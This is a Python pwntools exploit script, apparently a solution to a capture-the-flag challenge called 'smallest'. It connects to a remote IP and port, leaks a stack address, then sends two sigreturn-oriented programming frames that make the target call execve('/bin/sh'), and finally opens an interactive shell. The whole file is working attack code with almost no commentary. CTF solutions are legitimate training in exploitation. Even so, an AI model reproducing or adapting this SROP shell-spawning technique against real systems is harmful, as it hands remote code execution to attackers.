from pwn import *
context(os='linux', arch='amd64', log_level='debug')

DEBUG = 0
GDB = 0

if DEBUG:
    p = process("./smallest")
else:
    p = remote('202.112.51.184',19009)

def pwn(addr):
    '''
    addr should be writable address
    '''
    ret_addr = 0x4000b0 # another read
    syscall_addr = 0x4000be # only syscall
    frame = SigreturnFrame()
    frame.rsp = addr # any writable address(maybe in stack)
    frame.rip = ret_addr
    payload = p64(ret_addr)
    payload += 'd' * 8
    payload += str(frame)
    p.send(payload)


    # second read, enter sysreturn
    payload = p64(syscall_addr)
    payload += '\x11' * (15 - len(payload))
    p.send(payload)

    yes = raw_input()
    # another read now, to the choosed addr as rsp
    frame2 = SigreturnFrame()
    frame2.rsp = addr + 400
    frame2.rax = constants.SYS_execve
    frame2.rdi = addr + 400
    frame2.rsi = addr + 400 + len("/bin/sh\x00")
    frame2.rdx = 0 
    frame2.rip = syscall_addr
    payload = p64(ret_addr)
    payload += 'b' * 8
    payload += str(frame2)
    payload += 'a' * (400 - len(payload))
    payload += '/bin/sh\x00'
    payload += p64(addr + 400)

    p.send(payload)

    yes = raw_input()

    # another sigreturn
    payload = p64(syscall_addr)
    payload += '\x00' * (0xf - len(payload))
    p.send(payload)


def leak():
    read_again = 0x4000b0
    rdi_syscall_addr = 0x4000bb
    payload = p64(read_again)
    payload += p64(rdi_syscall_addr)
    payload += p64(read_again)
    p.send(payload)

    yes = raw_input()
    p.send('\xbb')
    recved = p.recvuntil('\x7f')
    then = p.recv()
    leak = u64(recved[-6:] + then[:2])
    log.info("leaking:" + hex(leak))
    return leak

def main():
    if GDB:
        pwnlib.gdb.attach(p)
    #leak()
    addr = leak() & 0xfffffffffffffff000
    addr -= 0x2000
    log.info("on addr: " + hex(addr))
    pwn(addr)
    p.interactive()

if __name__ == '__main__':
    main()